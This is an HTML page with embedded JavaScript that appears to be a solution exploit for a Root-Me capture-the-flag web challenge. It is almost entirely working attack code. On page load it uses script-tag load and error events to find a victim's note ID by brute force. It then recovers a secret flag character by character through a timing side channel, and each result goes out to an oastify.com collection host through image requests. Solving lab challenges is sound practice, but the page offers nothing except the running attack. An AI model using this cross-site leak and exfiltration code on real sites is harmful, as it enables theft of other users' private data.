<!DOCTYPE html>
<html>
<head>
    <title>Automated Verification Exploit</title>
</head>
<body>
    <h1>Processing safe content rendering...</h1>
    <div id="status" style="font-family: sans-serif; color: blue;">Initializing session...</div>

    <script>
        const targetOrigin = "https://web-client-ch56.challenge01.root-me.org:58056";
        const exfilUrl     = "http://d3hf8gt505zvmoc493wglh73wu2lqbe0.oastify.com/?flag=";   // <-- replace with your oastify URL
        const alphabet     = "abcdefghijklmnopqrstuvwxyz0123456789_+";
        
        let baseUrl    = targetOrigin + "/notes/";
        let targetBase = "";   // discovered dynamically: .../notes/{id}/
        let currentFlag = "";

        const sleep = ms => new Promise(res => setTimeout(res, ms));

        function exfil(data) {
            new Image().src = exfilUrl + encodeURIComponent(data);
        }

        function measureTrueNetworkTime(url) {
            return new Promise((resolve) => {
                const img = new Image();
                const start = performance.now();
                img.onload = img.onerror = () => { resolve(performance.now() - start); };
                img.src = url;
            });
        }

        // ------------------------------------------------------------------
        // PHASE 1: findId  (script-tag onload/onerror oracle)
        // ------------------------------------------------------------------
        const findId = async () => {
            // Fast path: search outward from your own ID (3730).
            // The bot is usually created near your account on the same instance.
            const myId = 3730;
            let candidates = [myId];
            for (let i = 1; i <= 25; i++) {
                candidates.push(myId + i);
                candidates.push(myId - i);
            }

            let foundId = null;

            for (let id of candidates) {
                if (id < 1) continue;

                let hit = await new Promise((resolve) => {
                    const s = document.createElement("script");
                    s.onload = () => {           // 200 OK (silent JS parse fail) = valid ID
                        document.body.removeChild(s);
                        resolve(true);
                    };
                    s.onerror = () => {          // 404 = invalid ID
                        document.body.removeChild(s);
                        resolve(false);
                    };
                    s.src = baseUrl + id;
                    document.body.appendChild(s);
                });

                if (hit) {
                    foundId = id;
                    break;
                }
            }

            // Fallback: brute-force from 1 if the nearby sweep missed
            if (!foundId) {
                exfil("FALLBACK_BRUTEFORCE");
                let id = 1;
                let searching = true;
                while (searching && id <= 10000) {
                    let hit = await new Promise((resolve) => {
                        const s = document.createElement("script");
                        s.onload = () => { document.body.removeChild(s); resolve(true); };
                        s.onerror = () => { document.body.removeChild(s); resolve(false); };
                        s.src = baseUrl + id;
                        document.body.appendChild(s);
                    });

                    if (hit) {
                        foundId = id;
                        searching = false;
                    } else {
                        id++;
                        if (id % 100 === 0) exfil("PROGRESS_" + id);
                    }
                }
            }

            targetBase = baseUrl + foundId + "/";
            exfil("FOUND_ID_" + foundId);
            document.getElementById("status").innerText = "ID found: " + foundId;
        };

        // ------------------------------------------------------------------
        // PHASE 2: Timing-oracle flag extraction
        // ------------------------------------------------------------------
        async function crackFlag() {
            document.getElementById("status").innerText = "Cracking flag on " + targetBase + "...";
            let cracking = true;

            while (cracking) {
                let foundChar = false;

                for (let char of alphabet) {
                    let candidate = currentFlag + char;
                    let duration  = await measureTrueNetworkTime(targetBase + candidate);

                    // Blueprint: backend introduces ~2.1 s delay on prefix match
                    if (duration > 2000 && duration < 3000) {
                        currentFlag += char;
                        foundChar = true;
                        exfil("FLAG_" + currentFlag);
                        await sleep(1000);
                        break;
                    }
                    await sleep(400);
                }

                if (!foundChar) {
                    exfil("DONE_" + currentFlag);
                    cracking = false;
                    document.getElementById("status").innerText = "Completed: " + currentFlag;
                }
            }
        }

        // ------------------------------------------------------------------
        // MAIN
        // ------------------------------------------------------------------
        async function startExploit() {
            exfil("BOT_CLICK_CONFIRMED_OK");
            document.getElementById("status").innerText = "Warming up...";

            // Warm TCP/TLS and session cache (blueprint recommendation)
            window.open(baseUrl, "extractor_win");
            await sleep(1500);

            await findId();
            await crackFlag();
        }

        window.onload = () => setTimeout(startExploit, 500);
    </script>
</body>
</html>
